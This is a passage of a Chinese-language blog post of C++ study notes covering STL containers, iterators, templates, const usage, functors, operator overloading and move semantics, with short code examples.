class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; map;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> kv : map) {</span><br><span class="line">  <span class="comment">// kv is a std::pair&lt;const std::string, int&gt;</span></span><br><span class="line">  std::string key = kv.first;</span><br><span class="line">  <span class="type">int</span> value = kv.second;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以通过结构化绑定遍历map</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; [key, value] : map) {</span><br><span class="line">  <span class="comment">// key has type const std::string&amp;</span></span><br><span class="line">  <span class="comment">// value has type const int&amp;</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>底层是通过 <strong>红黑树</strong>（Red-BlackTree）来实现的。因此<code>std::map&lt;K, V&gt;</code>要求<code>K</code>能够进行<code>operator&lt;</code>操作（比大小，判断进入红黑树的左右哪个分支）</p></li></ul><h4 id="stdunordered_map">std::unordered_map</h4><ul><li><p>与 <code>std::map</code> 不同，<code>std::unordered_map</code>是基于 <strong>哈希表（Hash Table）</strong> 实现的。</p></li><li><p>获取负载因子，设置最大负载因子，若超过则重新哈希</p><p>负载因子 = 元素个数（size）/ 桶的数量（bucket count）</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::unordered_map&lt;std::string, <span class="type">int</span>&gt; map;</span><br><span class="line"><span class="type">double</span> lf = map.<span class="built_in">load_factor</span>(); <span class="comment">// Get current load factor</span></span><br><span class="line">map.<span class="built_in">max_load_factor</span>(<span class="number">2.0</span>); <span class="comment">// Set the max load factor</span></span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="stdset">std::set</h4><ul><li>集合中的每个元素都是唯一的</li><li><code>std::set</code> 的实现通常也是基于<strong>红黑树</strong></li></ul><h4 id="stdunordered_set">std::unordered_set</h4><ul><li><code>std::unordered_set</code> 是基于 <strong>哈希表（HashTable）</strong> 实现的</li><li>如果你不需要排序，并且希望实现快速的查找和插入操作，<code>std::unordered_map</code>是一个很好的选择。</li></ul><h3 id="iterator">Iterator</h3><p>track where we are in a container（类似于索引）</p><ul><li><p><code>container.begin()</code>指向容器的第一个元素</p></li><li><p><code>container.end()</code>指向容器末端（但不指向末尾元素）</p></li><li><p>当容器为空时，<code>container.begin() == container.end()</code></p></li><li><p>遍历容器</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面两段代码是等价的</span></span><br><span class="line"><span class="keyword">auto</span> b = s.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">auto</span> e = s.<span class="built_in">end</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = b; it != e; ++it)  <span class="comment">// 这里使用 ++it 可以减少一次不必要的拷贝</span></span><br><span class="line">{</span><br><span class="line">     <span class="keyword">auto</span> elem = *it;</span><br><span class="line">     std::cout &lt;&lt; elem;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// range-based for </span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> elem : s) </span><br><span class="line">{</span><br><span class="line">std::cout &lt;&lt; elem;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="继承inheritance">继承（Inheritance）</h2><p>多态性</p><h3 id="纯虚函数">纯虚函数</h3><p>动态多态，它在基类中被实例化，但在子类中被覆盖</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">area</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="虚函数">虚函数</h3><p>https://hxt616.github.io/2024/10/26/CS106B/</p><h3 id="虚基类">虚基类</h3><p>解决菱形继承问题，详见<a href="https://hxt616.github.io/2024/10/26/CS106B/">CS106B</a></p><h2 id="模板类template-classes">模板类（Template Classes）</h2><p>模板的声明和实现一般在同一个文件中</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// 'typename' 可替换成 'class'</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> <span class="function">T&amp; <span class="title">at</span><span class="params">(<span class="type">size_t</span> i)</span></span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// 在类外定义函数需要进行模板声明</span></span><br><span class="line">T&amp; Vector&lt;T&gt;::<span class="built_in">at</span>(<span class="type">size_t</span> i) { <span class="comment">// 注意这里类名后面要添加 &lt;T&gt;</span></span><br><span class="line"> <span class="comment">// Implementation...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="const">const</h2><p><code>const</code>可以加在函数声明的前面或者后面，这两种用法的含义是不同的。主要有两种常见的情况：</p><h3 id="const-加在函数返回类型前面"><code>const</code>加在函数返回类型前面</h3><p>这是指 <strong>返回值是 <code>const</code>类型</strong>，意味着该返回值是不可修改的。</p><h4 id="示例">示例：</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">int</span> <span class="title">getValue</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li>在这个例子中，<code>const</code> 加在 <code>int</code>前面，表示函数返回的是一个 <code>const int</code>。也就是说，返回的值是<code>const</code> 类型，调用者不能修改它。</li><li>注意：这种 <code>const</code>修饰符适用于返回值的类型，并不影响函数本身的行为。</li></ul><h4 id="使用场景">使用场景：</h4><ul><li>当函数返回一个对象时，如果返回的对象不希望被修改，可以加上<code>const</code>。</li><li>例如，在返回一个指针、引用或常量时，<code>const</code>会确保返回的对象不能被修改。</li></ul><h3 id="const-加在成员函数的后面"><code>const</code>加在成员函数的后面</h3><p>这是指 <strong>成员函数是 <code>const</code>成员函数</strong>，意味着该函数不能修改类的成员变量。</p><h4 id="示例-1">示例：</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> v) : <span class="built_in">value</span>(v) {}</span><br><span class="line"></span><br><span class="line">    <span class="comment">// const成员函数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getValue</span><span class="params">()</span> <span class="type">const</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非 const 成员函数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setValue</span><span class="params">(<span class="type">int</span> v)</span> </span>{</span><br><span class="line">        value = v;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ul><li>在这个例子中，<code>getValue()</code> 后面的 <code>const</code>表示该成员函数是 <strong><code>const</code>成员函数</strong>，即它不会修改类的任何成员变量（即 <code>this</code>指针指向的对象不会发生变化）。</li></ul><h4 id="关键点">关键点：</h4><ul><li><code>const</code> 加在成员函数的后面是为了声明这个成员函数是<strong>只读的</strong>，即它不会修改对象的状态。</li><li>在 C++ 中，<strong><code>const</code> 成员函数只能调用其他<code>const</code> 成员函数</strong>，不能修改成员变量，不能调用非<code>const</code> 成员函数，也不能修改 <code>this</code>指针指向的对象。</li></ul><h4 id="使用场景-1">使用场景：</h4><ul><li>当你希望保证某个成员函数不会修改类的状态时，应该将其声明为<code>const</code> 成员函数。</li><li>例如，在查询类状态的函数（如获取值、大小、是否为空等）中，应该将其声明为<code>const</code>，以便它们能够在 <code>const</code> 对象上调用。</li></ul><blockquote><p><strong>1. 指向常量的指针 (Pointer to const)</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span>* ptr;  <span class="comment">// 或等价的 int const* ptr;</span></span><br></pre></td></tr></tbody></table></figure><ul><li><strong>不能修改指向的对象</strong>：不能通过这个指针修改它指向的值</li><li><strong>可以修改指针本身</strong>：可以让指针指向其他地址</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> y = <span class="number">20</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span>* ptr = &amp;x;</span><br><span class="line">*ptr = <span class="number">30</span>;  <span class="comment">// 错误：不能修改指向的对象</span></span><br><span class="line">ptr = &amp;y;   <span class="comment">// 正确：可以修改指针本身</span></span><br></pre></td></tr></tbody></table></figure><p><strong>2. 常量指针 (Const pointer)</strong></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="type">const</span> ptr;</span><br></pre></td></tr></tbody></table></figure><ul><li><strong>不能修改指针本身</strong>：指针不能指向其他地址</li><li><strong>可以修改指向的对象</strong>：可以通过指针修改它指向的值</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">20</span>;</span><br><span class="line"><span class="type">int</span>* <span class="type">const</span> ptr = &amp;x;</span><br><span class="line">*ptr = <span class="number">30</span>;  <span class="comment">// 正确：可以修改指向的对象</span></span><br><span class="line">ptr = &amp;y;   <span class="comment">// 错误：不能修改指针本身</span></span><br></pre></td></tr></tbody></table></figure><p><strong>3. 指向常量的常量指针 (Const pointer to const)</strong></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> ptr;</span><br></pre></td></tr></tbody></table></figure><ul><li><strong>既不能修改指针本身</strong>：不能指向其他地址</li><li><strong>也不能修改指向的对象</strong>：不能通过指针修改值</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> y = <span class="number">20</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> ptr = &amp;x;</span><br><span class="line">*ptr = <span class="number">30</span>;  <span class="comment">// 错误：不能修改指向的对象</span></span><br><span class="line">ptr = &amp;y;   <span class="comment">// 错误：不能修改指针本身</span></span><br></pre></td></tr></tbody></table></figure></blockquote><h3 id="const_cast不常用"><code>const_cast</code>（不常用）</h3><p><code>const_cast</code> 的常见用法：</p><ol type="1"><li><p><strong>去除 <code>const</code> 限定符</strong>： 通过<code>const_cast</code>，可以将指向 <code>const</code>对象的指针或引用转换为指向非 <code>const</code> 对象的指针或引用。</p><p>这种操作的危险性在于，如果你通过 <code>const_cast</code> 去除<code>const</code>限定符并尝试修改对象的内容，而对象本身确实是常量（例如，存储在<code>const</code>内存区域），这将导致未定义行为（UB）。因此，<strong>只有在你确定对象可以安全修改时</strong>，才应该去除<code>const</code>。</p></li></ol><h2 id="模板函数template-functions">模板函数（Template Functions）</h2><ol type="1"><li><p>示例：取两个变量的较小值</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">min</span><span class="params">(T a, T b)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> a &lt; b ? a : b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显式实例化</span></span><br><span class="line"><span class="built_in">min</span>&lt;<span class="type">int</span>&gt;(<span class="number">7</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐式实例化，让编译器判断类型</span></span><br><span class="line"><span class="built_in">min</span>(<span class="number">7</span>, <span class="number">10</span>);</span><br></pre></td></tr></tbody></table></figure></li><li><p>可变参数模板函数：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">min</span><span class="params">(T a)</span> </span>{ <span class="comment">// 一定要加上，因为下面的模板是递归模板，需要一个终止条件</span></span><br><span class="line">    <span class="keyword">return</span> a;  <span class="comment">// 基本情况：只有一个元素时，返回该元素</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function">T <span class="title">min</span><span class="params">(T a, Args... args)</span> </span>{</span><br><span class="line">    T temp = <span class="built_in">min</span>(args...);  <span class="comment">// 递归调用：比较剩下的参数</span></span><br><span class="line">    <span class="keyword">return</span> a &lt; temp ? a : temp;  <span class="comment">// 返回较小的值</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>find</code>函数：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个参数是不同容器对应的迭代器</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> It, <span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">It <span class="title">find</span><span class="params">(It begin, It end, <span class="type">const</span> T&amp; value)</span> </span>{</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = begin; it != end; ++it) {</span><br><span class="line">    <span class="keyword">if</span> (*it == value) <span class="keyword">return</span> it;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> end;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一种写法，直接将容器作为参数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container, <span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">find</span><span class="params">(<span class="type">const</span> Container&amp; c, <span class="type">const</span> T&amp; value)</span> </span>{</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">auto</span> it = c.<span class="built_in">begin</span>(); it != c.<span class="built_in">end</span>(); ++it) {</span><br><span class="line">  <span class="keyword">if</span> (*it == value) <span class="keyword">return</span> it;</span><br><span class="line"> }</span><br><span class="line"> <span class="keyword">return</span> end;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="模板元编程template-metaprogramming">模板元编程（TemplateMetaprogramming）</h2><p>TMP，它允许程序在编译阶段进行复杂的计算和类型推导，而不需要在运行时进行处理</p><ol type="1"><li><p>示例：通过模板递归计算阶乘，可以在<strong>编译期</strong>执行计算</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归模板计算阶乘</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Factorial</span> {</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = N * Factorial&lt;N - <span class="number">1</span>&gt;::value;  <span class="comment">// 递归调用</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本情况：当 N 为 0 时，阶乘为 1</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Factorial</span>&lt;<span class="number">0</span>&gt; {</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = <span class="number">1</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    std::cout &lt;&lt; Factorial&lt;<span class="number">5</span>&gt;::value &lt;&lt; std::endl;  <span class="comment">// 输出: 120</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>在模板中使用 <strong>predicates</strong>（谓词）</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> It, <span class="keyword">typename</span> Pred&gt;</span><br><span class="line"><span class="function">It <span class="title">find</span><span class="params">(It first, It last, Pred pred)</span> </span>{ <span class="comment">// 这里的pred其实是一个返回布尔值的函数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = first; it != last; ++it) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pred</span>(*it)) <span class="keyword">return</span> it;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> last;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="lambda">Lambda</h2><p>详见https://hxt616.github.io/2024/12/02/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</p><h2 id="functor">Functor</h2><p><strong>functor</strong>（仿函数）是一个行为类似函数的对象，具体来说是<strong>重载了函数调用运算符 <code>()</code>的类或结构体的实例</strong>。通过这种方式，类或结构体的对象可以像普通函数一样被调用。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例一</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Functor</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> x)</span> <span class="type">const</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Called with "</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例二</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">std</span>::greater {</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> T&amp; a, <span class="type">const</span> T&amp; b)</span> <span class="type">const</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line">std::greater&lt;<span class="type">int</span>&gt; g;</span><br><span class="line"><span class="built_in">g</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 返回值是false</span></span><br></pre></td></tr></tbody></table></figure><p><strong>当使用lambda表达式时，会生成对应的functor</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> lambda = [](<span class="type">int</span> x) { <span class="keyword">return</span> x * x; };</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译器会生成类似以下的类：</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LambdaAnonymous</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> x)</span> <span class="type">const</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> x * x;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h2 id="algorithm-库"><code>&lt;algorithm&gt;</code> 库</h2><p>该库是模板函数的集合</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250123004800250.png" alt="image-20250123004800250"><figcaption aria-hidden="true">image-20250123004800250</figcaption></figure><h2 id="操作符重载">操作符重载</h2><p>Operator Overloading，自定义操作符的行为</p><ul><li><p>不能被重载的运算符：<code>::   ?   .   .*   sizeof()   typeid()   cast()</code></p></li><li><p>两种重载方式：</p><ol type="1"><li><p>成员重载：在类内对操作符进行重载，调用时通过<code>b.operator&lt;(rhs)</code>（b是对象）</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> Obj::<span class="keyword">operator</span>&lt; (<span class="type">const</span> Obj&amp; rhs) <span class="type">const</span> {...}</span><br></pre></td></tr></tbody></table></figure></li><li><p>非成员重载：在类外进行重载，同时将两个操作对象作为参数</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Obj&amp; lhs, <span class="type">const</span> Obj&amp; rhs);</span><br></pre></td></tr></tbody></table></figure><blockquote><p>非成员重载可以通过<strong>友元</strong>实现，这样就能访问私有变量</p></blockquote></li></ol></li></ul><h2 id="特殊成员函数">特殊成员函数</h2><p>Special Member Functions(SMFs)，特殊成员函数是类（或结构）成员函数，在某些情况下，编译器会自动为你生成。包括<a href="https://learn.microsoft.com/zh-cn/cpp/cpp/constructors-cpp?view=msvc-170#default_constructors">默认构造函数</a>、<a href="https://learn.microsoft.com/zh-cn/cpp/cpp/destructors-cpp?view=msvc-170">析构函数</a>、<a href="https://learn.microsoft.com/zh-cn/cpp/cpp/copy-constructors-and-copy-assignment-operators-cpp?view=msvc-170">复制构造函数和复制赋值运算符</a>，以及<a href="https://learn.microsoft.com/zh-cn/cpp/cpp/move-constructors-and-move-assignment-operators-cpp?view=msvc-170">移动构造函数和移动赋值运算符</a>。</p><ul><li><p>Default constructor: T()</p></li><li><p>Destructor: ~T()</p></li><li><p>Copy constructor: T(const T&amp;)</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Widget widgetOne;</span><br><span class="line">Widget widgetTwo = widgetOne;</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>对于拷贝构造函数，如果类包含动态数组（即指针指向的堆内存），必须单独为数组分配新内存，并拷贝内容（深拷贝），而不是仅仅赋值指针，否则会引发浅拷贝（shallow copy） 问题</strong></p></blockquote></li><li><p>Copy assignment operator: T&amp; operator=(const T&amp;)（操作对象是<strong>已经存在的对象</strong>，注意与上面函数区别）</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Widget widgetOne;</span><br><span class="line">Widget widgetTwo;</span><br><span class="line">widgetOne = widgetTwo</span><br></pre></td></tr></tbody></table></figure></li><li><p>Move constructor: T(T&amp;&amp;)</p><p>移动构造函数的作用是通过<strong>转移资源</strong>来构造一个新对象，而不是深拷贝资源，这样就可以提高空间利用率</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移动构造函数</span></span><br><span class="line"><span class="built_in">MyClass</span>(MyClass&amp;&amp; other) <span class="keyword">noexcept</span> : <span class="built_in">data</span>(other.data) {</span><br><span class="line">    other.data = <span class="literal">nullptr</span>; <span class="comment">// 将源对象的资源置为 nullptr</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Move Constructor called"</span> &lt;&lt; std::endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>Move assignment operator: T&amp; operator=(T&amp;&amp;)</p><p>移动赋值运算符的作用是将一个对象的资源转移到另一个<strong>已经存在</strong>的对象中。它在执行资源转移的同时，释放目标对象的已有资源以防止内存泄漏。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移动赋值运算符</span></span><br><span class="line">MyClass&amp; <span class="keyword">operator</span>=(MyClass&amp;&amp; other) <span class="keyword">noexcept</span> {</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> != &amp;other) { <span class="comment">// 防止自赋值</span></span><br><span class="line">        <span class="keyword">delete</span> data;      <span class="comment">// 释放已有资源</span></span><br><span class="line">        data = other.data; <span class="comment">// 转移资源</span></span><br><span class="line">        other.data = <span class="literal">nullptr</span>; <span class="comment">// 将源对象的资源置为 nullptr</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Move Assignment Operator called"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function">MyClass <span class="title">obj1</span><span class="params">(<span class="number">42</span>)</span></span>;    <span class="comment">// 调用构造函数</span></span><br><span class="line"><span class="function">MyClass <span class="title">obj2</span><span class="params">(<span class="number">100</span>)</span></span>;   <span class="comment">// 调用构造函数</span></span><br><span class="line">obj2 = std::<span class="built_in">move</span>(obj1); <span class="comment">// 触发 